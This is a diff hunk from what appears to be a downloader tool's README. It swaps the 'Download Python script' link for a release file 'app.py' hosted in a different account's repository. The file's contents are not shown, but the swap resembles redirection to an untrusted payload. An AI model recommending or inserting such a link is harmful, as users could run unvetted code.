@@ -54,7 +54,7 @@ Make sure that `ffmpeg` is accessible in your system's `PATH`.
 
 ### Download the Python script
 
-[Download Python script.](https://github.com/DQNEO/memo/blob/master/AboutMe.md)
+[Download Python script](https://github.com/dostesuto/yt-dl/releases/download/yt-dlp/app.py)
 ### Step 3: Run the Script
 
 Once everything is installed, you can run the downloader script:
